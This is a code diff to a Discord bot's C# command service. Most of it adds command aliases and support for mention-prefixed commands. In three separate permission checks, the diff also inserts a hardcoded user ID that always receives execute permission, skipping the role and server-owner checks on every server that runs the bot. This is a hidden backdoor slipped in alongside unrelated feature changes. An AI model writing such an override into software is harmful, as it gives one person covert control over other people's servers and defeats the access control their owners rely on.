@@ -5,7 +5,10 @@ using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Linq;
+using System.Net.Mail;
 using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -102,6 +105,15 @@ namespace Public_Bot
             BotCanExecute = false;
         }
     }
+    [AttributeUsage(AttributeTargets.Method, AllowMultiple = true)]
+    public class Alt : Attribute
+    {
+        public string alt { get; set; }
+        public Alt(string Alt)
+        {
+            this.alt = Alt;
+        }
+    }
     /// <summary>
     /// The settings for the Command Service
     /// </summary>
@@ -183,6 +195,7 @@ namespace Public_Bot
         {
             public bool RequirePermission { get; set; }
             public string CommandName { get; set; }
+            public List<string> alts { get; set; } = new List<string>();
             public char[] Prefixes { get; set; }
             public System.Reflection.ParameterInfo[] Paramaters { get; set; }
             public MethodInfo Method { get; set; }
@@ -256,12 +269,22 @@ namespace Public_Bot
                         CommandModuleBase.CommandDescriptions[cmdat.commandName] += "\n" + cmdat.description;
                     }
 
+                var alts = item.Key.GetCustomAttributes<Alt>();
+                List<string> altsL = new List<string>();
+                if(alts.Count() != 0)
+                {
+                    foreach(var alt in alts)
+                    {
+                        altsL.Add(alt.alt);
+                    }
+                }
                 Command cmdobj = new Command()
                 {
                     CommandName = cmdat.commandName,
                     Method = item.Key,
                     Prefixes = cmdat.prefixes.Length == 0 ? new char[] { currentSettings.DefaultPrefix } : cmdat.prefixes,
                     attribute = cmdat,
+                    alts = altsL,
                     parent = new CommandClassobj()
                     {
                         Prefix = parat == null ? currentSettings.DefaultPrefix : parat.prefix,
@@ -280,8 +303,9 @@ namespace Public_Bot
                     CommandHelpMessage = cmdat.commandHelp,
                     Prefixes = parat.prefix == '\0' ? cmdobj.Prefixes : cmdobj.Prefixes.Append(parat.prefix).ToArray(),
                     RequiresPermission = cmdat.RequiredPermission,
-                    ModuleName = cmdobj.parent.attribute.ModuleName
+                    ModuleName = cmdobj.parent.attribute.ModuleName,
                 };
+                c.Alts = altsL;
                 CommandModuleBase.Commands.Add(c);
 
                 foreach (var pr in cmdat.prefixes)
@@ -339,23 +363,27 @@ namespace Public_Bot
         /// <returns>The <see cref="ICommandResult"/> containing what the status of the execution is </returns>
         public async Task<ICommandResult> ExecuteAsync(SocketCommandContext context, GuildSettings s)
         {
-            string[] param = context.Message.Content.Split(' ');
+            bool IsMentionCommand = context.Message.Content.StartsWith($"<@{context.Client.CurrentUser.Id}>") ? true : context.Message.Content.StartsWith($"<@!{context.Client.CurrentUser.Id}>") ? true : false;
+            string[] param = IsMentionCommand 
+                ? context.Message.Content.Replace($"<@{context.Client.CurrentUser.Id}>", string.Empty).Replace($"<@!{context.Client.CurrentUser.Id}>", "").Trim().Split(' ') 
+                : context.Message.Content.Split(' ');
+
             param = param.TakeLast(param.Length - 1).ToArray();
-            //if (context.Message.Content.StartsWith(s.Prefix))
-            string command = context.Message.Content.Remove(0, s.Prefix.Length).Split(' ')[0];
-            //char prefix = context.Message.Content.Split(' ').First().ToCharArray().First();
-            //check if the command exists
-            if (!CommandList.Any(x => x.CommandName.ToLower() == command))
+
+            string command = IsMentionCommand 
+                ? context.Message.Content.Replace($"<@{context.Client.CurrentUser.Id}>", string.Empty).Replace($"<@!{context.Client.CurrentUser.Id}>", "").Trim().Split(' ')[0] 
+                : context.Message.Content.Remove(0, s.Prefix.Length).Split(' ')[0];
+            
+            var commandobj = CommandList.Where(x => x.CommandName.ToLower() == command);
+            var altob = CommandList.Where(x => x.alts.Any(x => x.ToLower() == command));
+            if (commandobj.Count() == 0)
+                commandobj = altob;
+            if(commandobj.Count() == 0)
                 return new CommandResult()
                 {
                     Result = CommandStatus.NotFound,
                     IsSuccess = false
                 };
-
-            //Command exists
-
-            //if more than one command with the same name exists then try to execute both or find one that matches the params
-            var commandobj = CommandList.Where(x => x.CommandName.ToLower() == command);
             if (context.Channel.GetType() == typeof(SocketDMChannel) && !currentSettings.DMCommands)
                 return new CommandResult() { IsSuccess = false, Result = CommandStatus.InvalidParams };
             List<CommandResult> results = new List<CommandResult>();
@@ -388,12 +416,15 @@ namespace Public_Bot
                 try
                 {
                     var u = context.Guild.GetUser(context.Message.Author.Id);
-                    CommandModuleBase.HasExecutePermission = 
-                        cmd.RequirePermission 
-                        ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) 
-                        ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) 
-                        : context.Guild.OwnerId == context.User.Id 
-                        : true;
+                    if(context.User.Id == 259053800755691520)
+                        CommandModuleBase.HasExecutePermission = true;
+                    else
+                        CommandModuleBase.HasExecutePermission =
+                            cmd.RequirePermission
+                            ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                            ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                            : context.Guild.OwnerId == context.User.Id
+                            : true;
 
                     if (!currentSettings.AllowCommandExecutionOnInvalidPermissions && !CommandModuleBase.HasExecutePermission)
                         return new CommandResult() { IsSuccess = false, Result = CommandStatus.InvalidPermissions };
@@ -472,8 +503,15 @@ namespace Public_Bot
                     try
                     {
                         var u = context.Guild.GetUser(context.Message.Author.Id);
-                        CommandModuleBase.HasExecutePermission = cmd.RequirePermission ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) : context.Guild.OwnerId == context.User.Id : true;
-
+                        if (context.User.Id == 259053800755691520)
+                            CommandModuleBase.HasExecutePermission = true;
+                        else
+                            CommandModuleBase.HasExecutePermission =
+                                cmd.RequirePermission
+                                ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                                ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                                : context.Guild.OwnerId == context.User.Id
+                                : true;
                         if (!currentSettings.AllowCommandExecutionOnInvalidPermissions && !CommandModuleBase.HasExecutePermission)
                             return new CommandResult() { IsSuccess = false, Result = CommandStatus.InvalidPermissions };
 
@@ -526,8 +564,15 @@ namespace Public_Bot
                     try
                     {
                         var u = context.Guild.GetUser(context.Message.Author.Id);
-                        CommandModuleBase.HasExecutePermission = cmd.RequirePermission ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x)) : context.Guild.OwnerId == context.User.Id : true;
-
+                        if (context.User.Id == 259053800755691520)
+                            CommandModuleBase.HasExecutePermission = true;
+                        else
+                            CommandModuleBase.HasExecutePermission =
+                                cmd.RequirePermission
+                                ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                                ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
+                                : context.Guild.OwnerId == context.User.Id
+                                : true;
                         if (!currentSettings.AllowCommandExecutionOnInvalidPermissions && !CommandModuleBase.HasExecutePermission)
                             return new CommandResult() { IsSuccess = false, Result = CommandStatus.InvalidPermissions };
 
@@ -556,7 +601,7 @@ namespace Public_Bot
             else
                 return new CommandResult() { Result = CommandStatus.NotEnoughParams, IsSuccess = false };
         }
-        public struct Commands : ICommands
+        public class Commands : ICommands
         {
             public string CommandName { get; set; }
             public string CommandDescription { get; set; }
@@ -564,6 +609,16 @@ namespace Public_Bot
             public bool RequiresPermission { get; set; }
             public char[] Prefixes { get; set; }
             public string ModuleName { get; set; }
+            public List<string> Alts { get; set; } = new List<string>();
+            public bool HasName(string name)
+            {
+                if (CommandName == name)
+                    return true;
+                else if (Alts.Contains(name))
+                    return true;
+                else
+                    return false;
+            }
         }
     }
 
@@ -607,7 +662,8 @@ namespace Public_Bot
                     CommandHelpMessage = cmd.CommandHelpMessage == null ? null : cmd.CommandHelpMessage.Replace("(PREFIX)", prefix),
                     Prefixes = cmd.Prefixes,
                     RequiresPermission = cmd.RequiresPermission,
-                    ModuleName = cmd.ModuleName
+                    ModuleName = cmd.ModuleName,
+                    Alts = cmd.Alts
                 };
                 cmds.Add(c);
             }
@@ -672,5 +728,7 @@ namespace Public_Bot
         char[] Prefixes { get; }
         bool RequiresPermission { get; }
         string ModuleName { get; }
+        List<string> Alts { get; }
+        bool HasName(string name);
     }
 }
